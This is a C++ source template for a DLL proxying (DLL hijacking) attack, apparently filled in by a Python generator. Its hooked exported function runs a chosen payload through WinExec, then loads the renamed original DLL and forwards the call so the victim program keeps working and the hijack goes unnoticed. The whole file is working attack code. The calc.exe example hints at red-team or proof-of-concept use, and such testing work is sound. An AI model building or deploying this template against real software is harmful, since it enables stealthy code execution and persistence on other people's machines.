#include <windows.h>

// --- Automatic Proxy Forwarding ---
// The Python script will replace the line below with the #pragma comments
{{PROXY_EXPORTS}}

// --- Hooked Function ---
// This function intercepts the original call
extern "C" __declspec(dllexport) void {{HOOK_FUNC}}()
{
    // Check if the payload has already run to avoid loops or multiple executions
    static bool isPayloadExecuted = false;

    if (!isPayloadExecuted) 
    {
        // Execute the target payload (e.g., calc.exe)
        WinExec("{{EXEC_HOOK_FILE}}", SW_SHOW);
        isPayloadExecuted = true; 
    }

    // --- Load the Real DLL and Call the Original Function ---
    static HMODULE hReal = NULL;
    static void (*realFunc)() = NULL;

    // Load the renamed original DLL
    if (!hReal) {
        hReal = LoadLibraryA("{{PROXY_DLL_NAME}}.dll");
        if (hReal) {
            // Get the address of the original function
            realFunc = (void(*)())GetProcAddress(hReal, "{{HOOK_FUNC}}");
        }
    }

    // If found, call the original function to maintain program stability
    if (realFunc) {
        realFunc();
    }
}

// --- DLL Entry Point ---
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Code to run when the DLL is loaded
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}